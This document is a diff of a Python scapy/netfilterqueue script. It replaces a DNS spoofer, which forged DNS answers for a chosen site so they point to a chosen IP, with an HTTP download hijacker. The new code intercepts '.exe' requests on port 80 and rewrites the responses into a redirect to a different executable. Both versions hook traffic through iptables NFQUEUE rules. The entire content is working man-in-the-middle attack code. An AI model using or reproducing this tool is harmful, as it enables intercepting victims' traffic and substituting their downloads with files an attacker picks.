@@ -1,36 +1,41 @@
-import netfilterqueue
 import scapy.all as scapy
+import netfilterqueue
 import os
-key_website = bytes(input("enter the website u wanna redirect:"),  'utf-8')
-redirect_ip = input("enter ip you wanna redirect to:")
-que_num = int(input("enter queue number(for ip tables, if you dont know what to do, enter 3):"))
-print("IF AFTER QUITING THE PROGRAM, YOUR NETWORK CONECTIVITY GOES DOWN, RUN iptables -F")
-def process_packet(packet):
+ack_lst = []
+ 
+ 
+def replace_download(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.DNSRR):
-        qname = scapy_packet[scapy.DNSQR].qname    
-        if  key_website in qname:
-            print("[+] Spoofing Target")
-            answer = scapy.DNSRR(rrname=qname, rdata=redirect_ip)
-            scapy_packet[scapy.DNS].an = answer
-            scapy_packet[scapy.DNS].ancount = 1
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 80:
+            print("[+] HTTP Request", scapy_packet[scapy.TCP].ack)
+            if b".exe" in scapy_packet[scapy.Raw].load:
+                ack_lst.append(scapy_packet[scapy.TCP].ack)
  
-            del scapy_packet[scapy.IP].len
-            del scapy_packet[scapy.IP].chksum
-            del scapy_packet[scapy.UDP].chksum
-            del scapy_packet[scapy.UDP].len
- 
-            packet.set_payload(bytes(scapy_packet))
- 
- 
+        elif scapy_packet[scapy.TCP].sport == 80:
+            print("[+] HTTP Response", ack_lst)
+            if scapy_packet[scapy.TCP].seq in ack_lst:
+                print("[+] Replacing File")
+                # print(scapy_packet.show())
+                ack_lst.remove(scapy_packet[scapy.TCP].seq)
+                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://download.winzip.com/gl/nkln/winzip24-home.exe\n\n"
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.TCP].chksum
+                packet.set_payload(bytes(scapy_packet))
     packet.accept()
-os.system('iptables -I OUTPUT -j NFQUEUE --queue-num {}'.format(que_num))
-os.system('iptables -I INPUT -j NFQUEUE --queue-num {}'.format(que_num)) 
-os.system('iptables -I FORWARD -j NFQUEUE --queue-num {}'.format(que_num)) 
+ 
+ 
 try:
-    queue = netfilterqueue.NetfilterQueue()
-    queue.bind(que_num, process_packet)
-    queue.run()
-except:
-    os.system('iptables -F')
-    print("CTRL + C detected, flushing ip table and cleaning things up")
+    os.system('iptables -I OUTPUT -j NFQUEUE --queue-num {}'.format('1'))   
+    os.system('iptables -I INPUT -j NFQUEUE --queue-num {}'.format('1')) 
+    os.system('iptables -I FORWARD -j NFQUEUE --queue-num {}'.format('1'))
+    nfqueue = netfilterqueue.NetfilterQueue()
+    nfqueue.bind(1, replace_download)
+    nfqueue.run()
+except KeyboardInterrupt:
+    print("\n \n [+] Detected ctrl+c ... Quitting ...!!!")
+    
+'''
+
+'''
